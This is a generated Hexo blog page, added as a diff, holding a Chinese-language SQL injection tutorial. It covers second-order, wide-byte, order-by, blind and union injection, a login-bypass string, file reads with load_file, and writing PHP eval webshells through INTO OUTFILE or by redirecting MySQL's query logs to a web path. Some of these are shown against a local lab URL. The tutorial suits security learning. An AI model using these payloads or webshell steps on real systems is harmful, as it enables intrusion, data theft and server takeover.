@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>💉 SQLi_BYPASS Vol.1 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">💉 SQLi_BYPASS Vol.1</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>25 Minutes</li><li><i class="icon icon-calendar"></i>February 4, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-SQLi-BYPASS-Vol-1"><a href="#💉-SQLi-BYPASS-Vol-1" class="headerlink" title="💉 SQLi_BYPASS Vol.1"></a><center>💉 SQLi_BYPASS Vol.1</center></h2><h3 id="🎙️-0x00-前言"><a href="#🎙️-0x00-前言" class="headerlink" title="🎙️ 0x00 前言"></a>🎙️ 0x00 前言</h3><p>最近打算把 SQL 这一块整个复盘一遍。包含数据库的一些原理、学习到的注入 tricks、漏洞利用等等，直接上硬菜。</p>
+<p>注入其实分为三大类：盲注、报错、联合。</p>
+<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><p>这里先简单说说基本语句的使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 建立数据库</span><br><span class="line">mysql&gt; create database mysqltest;</span><br><span class="line"></span><br><span class="line">// 查询所有数据库</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line"></span><br><span class="line">// 使用该数据库并新建表</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysqltest;</span><br><span class="line">mysql&gt; create table admin(id int,username varchar(255),passwd varchar(255));</span><br><span class="line"></span><br><span class="line">// 查看所有表，插入数据，查询，where 语句</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">mysql&gt; insert into admin (id,username,passwd) values (1,&apos;nick&apos;,&apos;sdfsdf&apos;);</span><br><span class="line">mysql&gt; select * from admin;</span><br><span class="line">mysql&gt; select * from admin where id=1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-二次注入"><a href="#0x01-二次注入" class="headerlink" title="0x01 二次注入"></a>0x01 二次注入</h3><p><strong>原理</strong></p>
+<p>sql 语句没有被转义就直接存入数据库，然后再被读取查询导致错误。</p>
+<p>在 PHP 中常见于：数据在被插入时，被 <code>addslashes()``get_magic_quote_gpc</code> 等等转义，但是在写入数据库时还是脏数据，二次注入的造成原因有很多。</p>
+<p>可以用 16 进制编码来使 payload 不含单引号。二次注入多见于用户注册。</p>
+<p><strong>实例</strong></p>
+<p>在注册用户 <code>admin&#39;#</code> 时没有经过有效的转义，导致开发者认为该数据是安全的，进而导致可以绕过更改管理员的密码。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
+<p><strong>防御</strong></p>
+<ol>
+<li>不允许用户注册带有 <code>&#39;</code> 的名称。</li>
+<li>在从数据库或文件中提取数据的时候，也要进行转义或者过滤。</li>
+</ol>
+<h3 id="0x02-宽字节注入"><a href="#0x02-宽字节注入" class="headerlink" title="0x02 宽字节注入"></a>0x02 宽字节注入</h3><p><strong>原理</strong></p>
+<p>ASCII 占用一个字节，GBK 占用两个字节，UTF-8 占用三个字节。<br>要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析 SQL 语句，其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）。</p>
+<p><strong>位置</strong></p>
+<p>PHP 发送请求到 Mysql 时，字符集使用 <code>character_set_client</code> 设置值进行了一次编码， 然后服务器会根据 <code>character_set_connection</code> 把请求进行转码，然后更新到数据库的时候，再转化为字段所对应的编码。</p>
+<p>客户端字符集和连接层字符集一致就不会出现问题，不一致就可能在字符集转换过程中吃掉某些字符。</p>
+<p><strong>防御</strong></p>
+<ol>
+<li>使用 <code>mysql_set_charset(GBK)</code> 指定字符集</li>
+<li>使用 <code>mysql_real_escape_string</code> 进行转义</li>
+</ol>
+<h3 id="0x03-order-by-注入"><a href="#0x03-order-by-注入" class="headerlink" title="0x03 order by 注入"></a>0x03 order by 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin order by $id</span><br></pre></td></tr></table></figure>
+
+<p>order by 是用来判断列数的，其实就是按照第几列来进行排序的一个过程，如果超出列数则会报错。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04-1589352.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
+<p>要注意 <code>order by</code> 注入是不能直接使用 <code>and 1=1</code> 来判断的，他需要用到条件语句。</p>
+<h3 id="0x04-盲注"><a href="#0x04-盲注" class="headerlink" title="0x04 盲注"></a>0x04 盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>简单判断</strong></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.39.46.jpg" alt="Screenshot 2020-02-13 下午6.39.46"></p>
+<p>这里利用到了 if 条件语句判断 <code>if(a,b,c)</code>，如果 a 为真则执行 b，否则执行 c。</p>
+<p>所以第一个命令以 password 列排序，第二个命令返回 false，无序。</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>时间盲注不能直接简单地 <code>sleep()</code>，因为目标会对每条内容来执行语句，会造成 DOS 测试获取速度慢等问题，这时候需要用到子查询。</p>
+<p><strong>拓展</strong></p>
+<p>SQL 语句中 <code>substring</code> 函数是用来截取字符串中的一部分函数，在不同的数据库中该命令的名称不同。</p>
+<ul>
+<li>mysql: SUBSTR(),SUBSTRING()</li>
+<li>Oracle: SUBSTR()</li>
+<li>mssql: SUBSTRING()</li>
+</ul>
+<p>用法：</p>
+<ol>
+<li><p><code>substr(str,x,y)</code>，str 表示被截取的字符串，x 表示从第几位开始截取，y 表示截取几位。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.58.56-1591646.jpg" alt="Screenshot 2020-02-13 下午6.58.56"></p>
+</li>
+<li><p><code>substr(str,pos)</code>，str 表示被截取的字符串，pos 表示从某个位置开始截取到结尾所有字符串。(该语句不能用于 mssql)</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%887.01.18.jpg" alt="Screenshot 2020-02-13 下午7.01.18"></p>
+</li>
+<li><p><code>concat(a,b,c)</code>，该函数使多个字符串连接成一个字符串。</p>
+<p><code>concat_ws(separator,a,b,c)</code>，第一个参数是分隔符。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%888.24.24%201.jpg" alt="Screenshot 2020-02-13 下午8.24.24 1"></p>
+</li>
+</ol>
+<p>这里用到了子查询，创造了条件判断，可以提高效率。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%887.20.17.jpg" alt="Screenshot 2020-02-13 下午7.20.17"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin order by if((substr((select user()),1,1)=&apos;r&apos;),(select 1 from (select sleep(2)) as b),password);</span><br></pre></td></tr></table></figure>
+
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用语法错误来注入，报错内容中含有错误的路径内容。</p>
+<h3 id="0x05-from"><a href="#0x05-from" class="headerlink" title="0x05 from"></a>0x05 from</h3><p>from 后面的注入比较少。</p>
+<p><code>select * from $id;</code></p>
+<ol>
+<li>可以结合 <code>order by</code> 来注入。</li>
+<li>可以使用联合查询来注入。</li>
+</ol>
+<p><code>select * from admin union select 1,user(),3;</code></p>
+<h3 id="0x06-limit"><a href="#0x06-limit" class="headerlink" title="0x06 limit"></a>0x06 limit</h3><p><code>select * from admin limit 0,1;</code></p>
+<p>0 表示初始位置，1 表示偏移量。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.11.25.jpg" alt="Screenshot 2020-02-13 下午9.11.25"></p>
+<h3 id="0x07-offset"><a href="#0x07-offset" class="headerlink" title="0x07 offset"></a>0x07 offset</h3><p><code>select * from admin limit 1 offset 0;</code></p>
+<p>用法和 limit 相似，但是位置正好相反。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.13.51.jpg" alt="Screenshot 2020-02-13 下午9.13.51"></p>
+<h3 id="0x08-万能密码"><a href="#0x08-万能密码" class="headerlink" title="0x08 万能密码"></a>0x08 万能密码</h3><p>万能密码的原理其实就是让条件恒成立，根据语句的形式来闭合。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos;or 1=1-- &apos; and password=&apos;123&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.19.03.jpg" alt="Screenshot 2020-02-13 下午9.19.03"></p>
+<h3 id="0x09-读写文件"><a href="#0x09-读写文件" class="headerlink" title="0x09 读写文件"></a>0x09 读写文件</h3><p>mysql 5.6.34 版本以后 secure_file_priv 的值默认为 null，该值为 null 时我们无法导出文件。</p>
+<p>secure_file_priv 的默认值被修改为无才能利用，更改此设置必须修改配置文件，不能用 sql 语句。因此必须管理员修改好这个权限才可以。</p>
+<p>Windows 在 my.ini 的 [mysqld] 下面加上 <code>secure_file_priv =</code> 即可，Linux 在 <code>/etc/my.cnf</code> 中修改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="读文件-load-file"><a href="#读文件-load-file" class="headerlink" title="读文件 load_file()"></a>读文件 load_file()</h4><p>可以把文件 hex 输出，文件名也是支持 hex 或 char 的（可以避免引号）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin union select 1,hex(load_file(&apos;d:\\1.txt&apos;)),3;</span><br></pre></td></tr></table></figure>
+
+<p>如果进入了 phpmyadmin 类似的平台，可以执行 sql 语句，可以选择把导入的数据插入表中，同时支持导入的函数还有 <code>load data infile</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table test(test text);</span><br><span class="line">insert into test(test) values (load_file(&apos;D:\\1.txt&apos;));</span><br><span class="line">select * from test;</span><br></pre></td></tr></table></figure>
+
+<p>如果能读文件，在渗透中会很有用，可以读配置文件、系统问题等等。</p>
+<h4 id="写文件-dumpfile-outfile"><a href="#写文件-dumpfile-outfile" class="headerlink" title="写文件 dumpfile/outfile"></a>写文件 dumpfile/outfile</h4><p>写文件一般会用到 dumpfile 或 outfile，他们是有区别的。</p>
+<p>outfile 会在行末写入新行，而且会转义换行符。</p>
+<p>dumpfile 能导出一个完整的文件，不会有任何转义，所以 udf 提权一般用的是 dumpfile。</p>
+<h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h5><p>条件：</p>
+<p>1）具有 root 权限。</p>
+<p>2）知道 web 服务器的绝对路径。（目录具有写入权限）</p>
+<p>3）没有配置 secure_file_priv</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 正常写法</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&apos;sb&apos;]);?&gt;&quot; into outfile &quot;/phpstudy/www/uploads/sb.php&quot;</span><br><span class="line"></span><br><span class="line">// 注入时可 union 联合查询时</span><br><span class="line">?id=13 and 1=2 union select 1,2,3,4,5 &quot;&lt;?php @eval($_POST[&apos;sb&apos;]);?&gt;&quot; into outfile &quot;/phpstudy/www/uploads/sb.php&quot;</span><br><span class="line"></span><br><span class="line">// 不可 union 联合查询时</span><br><span class="line">?id=13) into outfile &quot;/phpstudy/www/uploads/sb.php&quot; fields terminated by &quot;&lt;?php @eval(@_POST[SBSB]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>⚠️ 注意：</p>
+<p>1）绝对路径的猜解。</p>
+<p>2）into outfile 后面的路径。比如说 “c:\wamp\uploads\muma.php” 有时需要变成 “c:\wamp\uploads\muma.php”（对反斜杠做了一次转义）</p>
+<p>3）路径可以编码十六进制。</p>
+<p>4）实际利用时候的 payload 是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,2 &apos;&lt;?php @eval($_post[SB]);?&gt;&apos; into outfile &apos;/phpstudy/www/uploads/a.php&apos;</span><br></pre></td></tr></table></figure>
+
+<p>但是写入的内容只有联合查询查出的 1、2，一句话没有写进去，修改 payload 为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,&apos;&lt;?php @eval($_post[SB]);?&gt;&apos; into outfile &apos;/phpstudy/www/uploads/a.php&apos;</span><br></pre></td></tr></table></figure>
+
+<p>写入成功，这里需要注意一下。</p>
+<h4 id="Ticks"><a href="#Ticks" class="headerlink" title="Ticks"></a>Ticks</h4><p>通过日志写 shell 来解决这个难题，但是需要能直接执行 sql 语句，利用有限。通过更改日志路径，把查询的日志保存过去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br><span class="line">set global general_log_file=&apos;d://404.php&apos;;</span><br><span class="line">select &apos;&lt;?php @eval($_POST[sb]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>还有一种慢日志，原理一样。</p>
+<p><code>show global variables like &#39;%query_log%&#39;;</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.26.32.jpg" alt="Screenshot 2020-02-13 下午10.26.32"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file=&apos;D://404.php&apos;;</span><br><span class="line">select &apos;&lt;?php @eval($_POST[sb]);?&gt;&apos; or sleep(15);</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x10-堆叠查询"><a href="#0x10-堆叠查询" class="headerlink" title="0x10 堆叠查询"></a>0x10 堆叠查询</h3><p>mysql 是支持堆叠查询的。用 ; 分割语句，但是 PHP 原生的连接方式不支持，但是使用 PDO、mysqli_multi_query() 等等是支持多语句的。</p>
+<p>在使用堆叠查询时基本是没有回显的，而且其实很难遇到这种环境。</p>
+<p><code>select * from admin where id=1;select user();</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.33.10.jpg" alt="Screenshot 2020-02-13 下午10.33.10"></p>
+<p>如果对方支持堆叠查询，那么可以用日志来写 shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file=&apos;C://phpstudy//404.php&apos;;--+</span><br><span class="line"></span><br><span class="line">http://192.168.59.129/Less-38/?id=1%27;select &apos;&lt;?php eval($_POST[404]) ?&gt;&apos;;--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x11-表名解读"><a href="#0x11-表名解读" class="headerlink" title="0x11 表名解读"></a>0x11 表名解读</h3><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>这个库是在 <strong>mysql5.0</strong> 以后才有的。</p>
+<p>information_schema 是用于存储数据库元数据的库，它保存了数据库名、表名、列名等信息。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.41.44.jpg" alt="Screenshot 2020-02-13 下午10.41.44"></p>
+<p>常用到的几个表：</p>
+<ol>
+<li>schemata：提供了当前 mysql 实例中所有数据库的信息。</li>
+<li>tables：提供了关于数据库中的表的信息。</li>
+<li>columns：提供了表中的列信息。</li>
+</ol>
+<p><code>select * from information_schema.schemata;</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.45.44.jpg" alt="Screenshot 2020-02-13 下午10.45.44"></p>
+<p><code>select table_name from information_schema.tables where table_schema=&#39;admin&#39;;</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.52.18.jpg" alt="Screenshot 2020-02-13 下午10.52.18"></p>
+<p>这里要注意 <code>table_schema</code> 后跟的是数据库名称，可以用十六进制避免引号。</p>
+<p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39;;</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.57.32.jpg" alt="Screenshot 2020-02-13 下午10.57.32"></p>
+<p>⚠️ 注意：</p>
+<p>information_schema 存储的是所有数据库的信息，假如数据库 mysqltest1 和 mysqltest2 都有 admin 表的话，返回的将是：</p>
+<p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39;;</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.14.48.jpg" alt="Screenshot 2020-02-13 下午11.14.48"></p>
+<p>所以要指定库：</p>
+<p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39; and table_schema=&#39;mysqltest2&#39;;</code></p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.19.54.jpg" alt="Screenshot 2020-02-13 下午11.19.54"></p>
+<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>user 表保存用户的密码和 host 等信息。</p>
+<p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.33.52.jpg" alt="Screenshot 2020-02-13 下午11.33.52"></p>
+<h3 id="0x12-符号"><a href="#0x12-符号" class="headerlink" title="0x12 符号"></a>0x12 符号</h3><p>常用到的特殊符号有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;</span><br><span class="line">&quot;&quot;</span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line">\</span><br><span class="line">\\</span><br><span class="line">``</span><br><span class="line">%</span><br></pre></td></tr></table></figure>
+
+<h4 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h4><p>mysql 中有多种注释符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">/**/			/*/**/ 等效于 /**/</span><br><span class="line">-- +			用这个符号是注意是--空格任意字符，很多人搞混</span><br><span class="line">;%00</span><br><span class="line">`</span><br><span class="line">/*!*/			内列注释，它也可以当作一个空格，/*!/*!*/ 是等效于 /*!*/ 的</span><br></pre></td></tr></table></figure>
+
+<h4 id="操作符和逻辑操作符"><a href="#操作符和逻辑操作符" class="headerlink" title="操作符和逻辑操作符"></a>操作符和逻辑操作符</h4><p>排列在同一行的操作符具有相同的优先级。（优先级很重要）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">:=</span><br><span class="line">||,OR,XOR</span><br><span class="line">&amp;&amp;,AND</span><br><span class="line">NOT</span><br><span class="line">BETWEEN,CASE,WHEN,THEN,ELSE</span><br><span class="line">=,&lt;=&gt;,&gt;=,&gt;,&lt;,&lt;=,&lt;&gt;,!=,IS,LIKE,REGEXP,IN</span><br><span class="line">|</span><br><span class="line">&amp;</span><br><span class="line">&lt;&lt;,&gt;&gt;</span><br><span class="line">-,+</span><br><span class="line">*,/,DIV,%,MOD</span><br><span class="line">^</span><br><span class="line">-（一元减号）,~（一元比特反转）</span><br><span class="line">!</span><br><span class="line">BINARY,COLLATE</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x13-注入的产生"><a href="#0x13-注入的产生" class="headerlink" title="0x13 注入的产生"></a>0x13 注入的产生</h3><ol>
+<li>程序在开发的时候没有对用户输入的数据做过滤，把用户的数据都当作可信数据。</li>
+<li>过滤不严格。</li>
+<li>数据库配置不当。</li>
+<li>转义不当。</li>
+</ol>
+<h3 id="0x14-注入的类型"><a href="#0x14-注入的类型" class="headerlink" title="0x14 注入的类型"></a>0x14 注入的类型</h3><p>常见的有数字型、字符型、搜索型、盲注等等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = $id; //数字型 注入</span><br><span class="line"></span><br><span class="line">select * from admin where id = &apos;$id&apos;; //字符型</span><br><span class="line"></span><br><span class="line">select * from admin where id = &quot;$id&quot;;</span><br><span class="line"></span><br><span class="line">select * from admin where id = ($id);</span><br><span class="line"></span><br><span class="line">select * from admin where id = (&apos;$id&apos;);</span><br><span class="line"></span><br><span class="line">select * from admin where id = (&quot;$id&quot;);</span><br><span class="line"></span><br><span class="line">select * from admin where username  like &apos;%adm%&apos;;</span><br><span class="line"></span><br><span class="line">select * from admin where username  like (&apos;%adm%&apos;);</span><br><span class="line"></span><br><span class="line">select * from admin where id = $id limit 0,1;</span><br><span class="line"></span><br><span class="line">select * from admin order by $id;</span><br><span class="line"></span><br><span class="line">select * from admin order by limit 0,1 $id;</span><br><span class="line"></span><br><span class="line">select * from admin order by id limit 1,1 $id;</span><br><span class="line"></span><br><span class="line">insert注入</span><br><span class="line"></span><br><span class="line">update注入</span><br><span class="line"></span><br><span class="line">delete注入</span><br><span class="line"></span><br><span class="line">二次注入 </span><br><span class="line"></span><br><span class="line">等等</span><br></pre></td></tr></table></figure>
+
+<p>⚠️ 注意：</p>
+<ol>
+<li>当网站有成熟的 cms 框架时，不建议黑盒注入，可以直接审计代码或搜索已知漏洞。</li>
+<li>如果目标不是很重要可以尝试 AWVS 等工具。</li>
+<li>情报收集是最重要的，可能它的源码就在 GitHub 上，或者在某个备份文件上。</li>
+</ol>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck6ky46ov000chmozuc6bj7ic" data-title="💉 SQLi_BYPASS Vol.1" data-url="http://yoursite.com/2020/02/04/sqlibypass/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/12/MS14-068/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
